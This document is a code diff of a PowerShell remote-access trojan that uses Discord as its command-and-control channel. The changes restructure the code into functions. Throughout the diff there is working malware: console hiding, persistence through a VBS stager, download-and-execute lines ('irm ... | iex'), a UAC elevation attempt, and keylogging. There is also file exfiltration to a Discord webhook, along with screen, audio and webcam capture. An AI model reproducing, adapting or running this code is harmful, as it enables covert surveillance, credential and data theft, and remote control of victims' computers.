@@ -34,105 +34,20 @@ $hookurl = "$dc" # eg. https://discord.com/api/webhooks/123445623531/f4fw3f4r46r
 $token = "$tk" # make sure your bot is in the same server as the webhook
 $chan = "$ch" # make sure the bot AND webhook can access this channel
 
+$version = "1.3.1" # Check version and update
+$parent = "https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1" # parent script URL (for restarts and persistance)
+$response = $null
+$previouscmd = $null
+$HideWindow = 0 # HIDE THE WINDOW - Change to 1 to hide the console window
+$timestamp = Get-Date -Format "dd/MM/yyyy  @  HH:mm"
+
 # Shortened webhook detection
 if ($hookurl.Ln -ne 121){$hookurl = (irm $hookurl).url}
-
-# HIDE THE WINDOW - Change to 1 to hide the console window
-$HideWindow = 1
-If ($HideWindow -gt 0){
-$Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
-$Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
-$hwnd = (Get-Process -PID $pid).MainWindowHandle
-    if($hwnd -ne [System.IntPtr]::Zero){
-        $Type::ShowWindowAsync($hwnd, 0)
-    }
-    else{
-        $Host.UI.RawUI.WindowTitle = 'hideme'
-        $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
-        $hwnd = $Proc.MainWindowHandle
-        $Type::ShowWindowAsync($hwnd, 0)
-    }
-}
-
-# Check version and update
-$version = "1.3.1"
-$versionCheck = irm -Uri "https://pastebin.com/raw/3axupAKL"
-$VBpath = "C:\Windows\Tasks\service.vbs"
-if (Test-Path "$env:APPDATA\Microsoft\Windows\PowerShell\copy.ps1"){
-Write-Output "Persistance Installed - Checking Version.."
-    if (!($version -match $versionCheck)){
-        Write-Output "Newer version available! Downloading and Restarting"
-        RemovePersistance
-        AddPersistance
-        $tobat = @"
-Set WshShell = WScript.CreateObject(`"WScript.Shell`")
-WScript.Sleep 200
-WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$GHurl='$GHurl'; `$hookurl='$hookurl'; irm https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1 | iex`", 0, True
-"@
-        $tobat | Out-File -FilePath $VBpath -Force
-        sleep 1
-        & $VBpath
-        exit
-    }
-}
 
 # remove restart stager (if present)
 if(Test-Path "C:\Windows\Tasks\service.vbs"){
     rm -path "C:\Windows\Tasks\service.vbs" -Force
 }
-
-$parent = "https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1" # parent script URL (for restarts and persistance)
-$response = $null
-$previouscmd = $null
-function PullMsg {
-    $headers = @{
-        'Authorization' = "Bot $token"
-    }
-    $webClient = New-Object System.Net.WebClient
-    $webClient.Headers.Add("Authorization", $headers.Authorization)
-    $response = $webClient.DownloadString("https://discord.com/api/v9/channels/$chan/messages")
-    
-    if ($response) {
-        $most_recent_message = ($response | ConvertFrom-Json)[0]
-        if (-not $most_recent_message.author.bot) {
-            $response = $most_recent_message.content
-            $script:response = $response
-        }
-    } else {
-        Write-Output "No messages found in the channel."
-    }
-}
-PullMsg
-$previouscmd = $response
-
-$noraw = $ghurl -replace "/raw", ""
-$timestamp = Get-Date -Format "dd/MM/yyyy  @  HH:mm"
-$jsonPayload = @{
-    tts        = $false
-    embeds     = @(
-        @{
-            title       = "$env:COMPUTERNAME | C2 session started!"
-            "description" = @"
-**Enter Commands Here**
-
-Try : ``options`` for a list of commands 
-Use ``close`` to stop the session
-     
-"@
-            color       = 16711680
-            author      = @{
-                name     = "egieb"
-                url      = "https://github.com/beigeworm"
-                icon_url = "https://i.ibb.co/vJh2LDp/img.png"
-            }
-            footer      = @{
-                text = "$timestamp"
-            }
-        }
-    )
-}
-$jsonString = $jsonPayload | ConvertTo-Json -Depth 10 -Compress
-Invoke-RestMethod -Uri $hookUrl -Method Post -Body $jsonString -ContentType 'application/json'
 
 Function Options {
     $embed = @{
@@ -177,7 +92,6 @@ Function Options {
     Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
 }
 
-
 Function ExtraInfo {
 $embed = @{
     "title" = "Exfiltrate and Upload Command Examples"
@@ -208,6 +122,12 @@ This Eg. will scan 192.168.1.1 to 192.168.1.254
 **Record Examples:**
 > PS> ``RecordAudio -t 100`` (number of seconds to record)
 > PS> ``RecordScreen -t 100`` (number of seconds to record)
+
+**Kill Command modules:**
+- Keycapture
+- Exfiltrate
+- SendHydra
+- SpeechToText
 "@
     "color" = 16711680  # Red color
 }
@@ -281,10 +201,13 @@ $wshell.AppActivate('explorer.exe')
 $tab = 0
 while ($tab -lt 6){
 $wshell.SendKeys('{TAB}')
+sleep -m 100
 $tab++
 }
 $wshell.SendKeys('{ENTER}')
+sleep -m 200
 $wshell.SendKeys('{TAB}')
+sleep -m 200
 $wshell.SendKeys('{ESC}')
 $NearbyWifi = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Signal*" -or $_ -like "*Band*"}).trim() | Format-Table SSID, Signal, Band
 $Wifi = ($NearbyWifi|Out-String)
@@ -346,7 +269,7 @@ Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Bo
         $form.Location = New-Object System.Drawing.Point((Get-Random -Minimum 0 -Maximum 1000), (Get-Random -Minimum 0 -Maximum 1000))
         $result = $form.ShowDialog()
     
-        $messages = Invoke-RestMethod -Uri $GHurl
+        $messages = PullMsg
         if ($messages -match "kill") {
             $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":octagonal_sign: ``Hydra Stopped`` :octagonal_sign:"} | ConvertTo-Json
             Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
@@ -379,7 +302,7 @@ while ($true) {
         $jsonsys = @{"username" = $env:COMPUTERNAME ; "content" = $results} | ConvertTo-Json
         irm -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body $jsonsys
     }
-    $messages = Invoke-RestMethod -Uri $GHurl
+    $messages = PullMsg
     if ($messages -match "kill") {
     break
     }
@@ -428,9 +351,9 @@ $newScriptPath = "$env:APPDATA\Microsoft\Windows\PowerShell\copy.ps1"
 $scriptContent | Out-File -FilePath $newScriptPath -force
 sleep 1
 if ($newScriptPath.Length -lt 100){
-    "`$hookurl = `"$hookurl`"" | Out-File -FilePath $newScriptPath -Force
-    "`$ghurl = `"$ghurl`"" | Out-File -FilePath $newScriptPath -Force -Append
-    "`$ccurl = `"$ccurl`"" | Out-File -FilePath $newScriptPath -Force -Append
+    "`$dc = `"$hookurl`"" | Out-File -FilePath $newScriptPath -Force
+    "`$tk = `"$token`"" | Out-File -FilePath $newScriptPath -Force -Append
+    "`$ch = `"$chan`"" | Out-File -FilePath $newScriptPath -Force -Append
     i`wr -Uri "$parent" -OutFile "$env:temp/temp.ps1"
     sleep 1
     Get-Content -Path "$env:temp/temp.ps1" | Out-File $newScriptPath -Append
@@ -491,7 +414,7 @@ foreach ($folder in $foldersToSearch) {
             $entryName = $file.FullName.Substring($folder.Length + 1)
             [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zipArchive, $file.FullName, $entryName)
             $currentZipSize += $fileSize
-            $messages = Invoke-RestMethod -Uri $GHurl
+            $messages = PullMsg
             if ($messages -match "kill") {
                 $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":file_folder: ``Exfiltration Stopped`` :octagonal_sign:"} | ConvertTo-Json
                 Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
@@ -827,7 +750,7 @@ If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]:
 }
 
 Function AttemptElevate{
-$tobat = @"
+    $tobat = @"
 Set WshShell = WScript.CreateObject(`"WScript.Shell`")
 WScript.Sleep 200
 If Not WScript.Arguments.Named.Exists(`"elevate`") Then
@@ -835,15 +758,21 @@ If Not WScript.Arguments.Named.Exists(`"elevate`") Then
     , `"`"`"`" & WScript.ScriptFullName & `"`"`" /elevate`", `"`", `"runas`", 1
   WScript.Quit
 End If
-WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$hookurl='$hookurl';`$ghurl='$ghurl';`$ccurl='$ccurl'; irm https://raw.githubusercontent.com/beigeworm/PoshGram-C2/main/Telegram-C2-Client.ps1 | iex`", 0, True
+WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -C `$tk='$token'; `$ch='$chan'; `$dc='$hookurl'; irm https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1 | iex`", 0, True
 "@
-$pth = "C:\Windows\Tasks\service.vbs"
-$tobat | Out-File -FilePath $pth -Force
-& $pth
-Sleep 7
-rm -Path $pth
-$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":white_check_mark: ``UAC Prompt sent to the current user..`` :white_check_mark:"} | ConvertTo-Json
-Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+    $pth = "C:\Windows\Tasks\service.vbs"
+    $tobat | Out-File -FilePath $pth -Force
+    try{
+        & $pth
+        Sleep 7
+        rm -Path $pth
+        $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":white_check_mark: ``UAC Prompt sent to the current user..`` :white_check_mark:"} | ConvertTo-Json
+        Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+        exit
+    }
+    catch{
+    Write-Host "FAILED"
+    }
 }
 
 Function TakePicture {
@@ -903,7 +832,7 @@ While ($true){
                 }
             }
         }
-        $messages = Invoke-RestMethod -Uri $GHurl
+        $messages = PullMsg
         if ($messages -match "kill") {
         $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":mag_right: ``Keylogger Stopped`` :octagonal_sign:"} | ConvertTo-Json
         Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
@@ -911,7 +840,7 @@ While ($true){
         $tobat = @"
 Set WshShell = WScript.CreateObject(`"WScript.Shell`")
 WScript.Sleep 200
-WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$GHurl='$GHurl'; `$hookurl='$hookurl'; irm https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1 | iex`", 0, True
+WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tk='$tk'; `$ch='$ch'; `$hookurl='$hookurl'; irm https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1 | iex`", 0, True
 "@
         $tobat | Out-File -FilePath $VBpath -Force
         sleep 1
@@ -920,7 +849,7 @@ WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$GHurl='$GHurl'; `$
         }
     }
     finally{
-        $messages = Invoke-RestMethod -Uri $GHurl
+        $messages = PullMsg
         If (($keyPressed) -and (!($messages -match "kill"))) {
             $escmsgsys = $nosave -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
             $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":mag_right: ``Keys Captured :`` $escmsgsys"} | ConvertTo-Json
@@ -932,6 +861,58 @@ WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$GHurl='$GHurl'; `$
 $LastKeypressTime.Restart()
 Start-Sleep -Milliseconds 10
 }
+}
+
+# =================================================================================
+
+Function ConnectMsg {
+$jsonPayload = @{
+    tts        = $false
+    embeds     = @(
+        @{
+            title       = "$env:COMPUTERNAME | C2 session started!"
+            "description" = @"
+**Enter Commands Here**
+
+Try : ``options`` for a list of commands 
+Use ``close`` to stop the session
+     
+"@
+            color       = 16711680
+            author      = @{
+                name     = "egieb"
+                url      = "https://github.com/beigeworm"
+                icon_url = "https://i.ibb.co/vJh2LDp/img.png"
+            }
+            footer      = @{
+                text = "$timestamp"
+            }
+        }
+    )
+}
+$jsonString = $jsonPayload | ConvertTo-Json -Depth 10 -Compress
+Invoke-RestMethod -Uri $hookUrl -Method Post -Body $jsonString -ContentType 'application/json'
+}
+
+function PullMsg {
+    $headers = @{
+        'Authorization' = "Bot $token"
+    }
+    $webClient = New-Object System.Net.WebClient
+    $webClient.Headers.Add("Authorization", $headers.Authorization)
+    $response = $webClient.DownloadString("https://discord.com/api/v9/channels/$chan/messages")
+    
+    if ($response) {
+        $most_recent_message = ($response | ConvertFrom-Json)[0]
+        if (-not $most_recent_message.author.bot) {
+            $response = $most_recent_message.content
+            $script:response = $response
+            $script:messages = $response
+            return $response
+        }
+    } else {
+        Write-Output "No messages found in the channel."
+    }
 }
 
 Function GetFfmpeg{
@@ -952,6 +933,52 @@ $Path = "$env:Temp\ffmpeg.exe"
 $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":white_check_mark: ``Download Complete`` :white_check_mark:"} | ConvertTo-Json
 Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
 }
+
+Function HideConsole{
+    If ($HideWindow -gt 0){
+    $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
+    $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
+    $hwnd = (Get-Process -PID $pid).MainWindowHandle
+        if($hwnd -ne [System.IntPtr]::Zero){
+            $Type::ShowWindowAsync($hwnd, 0)
+        }
+        else{
+            $Host.UI.RawUI.WindowTitle = 'hideme'
+            $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
+            $hwnd = $Proc.MainWindowHandle
+            $Type::ShowWindowAsync($hwnd, 0)
+        }
+    }
+}
+
+Function VersionCheck {
+    $versionCheck = irm -Uri "https://pastebin.com/raw/3axupAKL"
+    $VBpath = "C:\Windows\Tasks\service.vbs"
+    if (Test-Path "$env:APPDATA\Microsoft\Windows\PowerShell\copy.ps1"){
+    Write-Output "Persistance Installed - Checking Version.."
+        if (!($version -match $versionCheck)){
+            Write-Output "Newer version available! Downloading and Restarting"
+            RemovePersistance
+            AddPersistance
+            $tobat = @"
+Set WshShell = WScript.CreateObject(`"WScript.Shell`")
+WScript.Sleep 200
+WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tk='$token'; `$ch='$chan'; `$dc='$hookurl'; irm https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1 | iex`", 0, True
+"@
+            $tobat | Out-File -FilePath $VBpath -Force
+            sleep 1
+            & $VBpath
+            exit
+        }
+    }
+}
+
+# =================================================================================
+
+PullMsg
+$previouscmd = $response
+VersionCheck
+ConnectMsg
 
 while($true){
 
@@ -980,3 +1007,4 @@ while($true){
     }
 sleep 5
 }
+
